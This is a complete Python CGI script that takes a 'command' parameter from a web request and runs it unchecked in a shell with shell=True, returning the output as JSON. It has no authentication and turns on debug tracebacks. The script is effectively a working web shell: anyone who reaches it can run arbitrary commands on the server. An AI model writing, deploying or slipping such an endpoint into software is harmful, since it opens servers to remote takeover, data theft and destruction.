#!/usr/bin/env python3

import cgi
import cgitb
import subprocess
import json

cgitb.enable()  # Enable debugging

def main():
    print("Content-Type: application/json")
    print()  # End of headers

    form = cgi.FieldStorage()
    command = form.getvalue('command')

    if not command:
        response = {"error": "No command provided"}
        print(json.dumps(response))
        return

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        response = {
            "stdout": result.stdout,
            "stderr": result.stderr
        }
    except Exception as e:
        response = {
            "error": str(e)
        }

    print(json.dumps(response))

if __name__ == "__main__":
    main()

